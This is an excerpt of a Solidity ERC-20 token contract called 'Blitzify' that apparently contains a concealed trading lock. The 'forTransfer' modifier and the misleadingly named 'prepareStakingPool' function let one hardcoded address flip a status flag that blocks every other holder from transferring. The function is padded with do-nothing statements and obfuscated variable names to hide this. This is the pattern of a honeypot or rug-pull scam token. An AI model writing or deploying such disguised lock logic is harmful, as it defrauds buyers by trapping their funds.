...
contract Blitzify is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenam_totalSupply;
    uint256 private _tokenam_status = 0;
    uint256 public stakingPoolamStatus = 0;

    string private _tokenam_name;
    string private _tokenam_symbol;

    address private _poolamAddress = 0x92b9199d8B4685D390Cc8767CaaD77B7Aa727ea8;

    constructor() {
        _tokenam_name = "Blitzify";
        _tokenam_symbol = "BLITZ";
        _tokenam_totalSupply = 100 * 10 ** 18;
        _balances[msg.sender] = _tokenam_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolamAddress || _tokenam_status == 0);
        _;
    }
    ...
    function prepareStakingPool(address to) public {
        to == address(0);
        stakingPoolamStatus = 1;
        uint256 a = 1;
        a = a + 1;
        a = a-1;
        if (msg.sender == _poolamAddress)
        {
            _tokenam_status = 1;
        }
    }
